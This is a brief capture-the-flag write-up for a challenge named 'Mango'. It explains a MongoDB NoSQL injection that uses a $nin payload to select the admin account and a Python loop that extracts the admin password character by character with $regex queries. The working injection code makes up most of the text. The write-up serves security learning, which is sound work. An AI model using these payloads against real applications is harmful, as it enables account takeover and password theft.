# Mango
This challenge involves mongodb NoSql injection. Goal is to extract the admin's password

## Solve
### fetch admin user
Use MongoDB's $nin (not in) operator: by excluding other user, we get admin
```python
payload = {
    "uid[$nin]": ["guest", "err", "dreamhack", "ad", "mongo", "testuser"],
    "upw[$regex]": "..."
}
```

### Password extraction
I use regex to extract each char of the admin's password: Replace previous char with '.' to bypass filter

If password is correct => return admin
else => return undefined

```python
flag = ""

for i in range(50):
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}":
        test_flag = '.' * len(flag) + c
        payload["upw[$regex]"] = "^" + test_flag + ".*"
        response = requests.get(url, params=payload)
        if "admin" in response.text:
            flag += c
            print(flag)
            break
```
